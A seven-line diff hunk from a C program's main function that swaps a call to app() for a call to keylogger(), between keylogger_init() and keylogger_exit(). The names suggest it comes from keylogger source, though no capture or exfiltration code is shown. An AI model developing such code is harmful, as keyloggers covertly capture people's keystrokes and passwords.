@@ -5,7 +5,7 @@ int main(int argc, char const *argv[])
 {
     keylogger_init();
 
-    app();
+    keylogger();
 
     keylogger_exit();
 
